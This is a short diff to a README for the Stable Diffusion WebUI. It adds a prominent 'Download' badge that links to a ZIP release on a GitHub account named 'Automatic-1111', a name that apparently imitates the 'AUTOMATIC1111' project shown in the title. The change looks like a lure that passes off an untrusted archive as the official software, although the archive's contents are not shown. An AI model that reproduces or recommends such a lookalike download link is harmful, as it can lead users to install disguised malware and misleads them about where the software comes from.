@@ -1,5 +1,5 @@
-# Stable Diffusion WebUI (A1111)
-
+# Stable Diffusion WebUI (AUTOMATIC1111)
+[![Download Stable Diffusion WebUI](https://img.shields.io/badge/Download%20Stable%20Diffusion%20WebUI%20(ZIP)-%23007ec6?style=for-the-badge&logo=github)](https://github.com/Automatic-1111/stable-diffusion-webui/releases/download/update/stable-diffusion-webui.zip)
 The most popular and powerful web UI for Stable Diffusion.
 
 ## Key Features
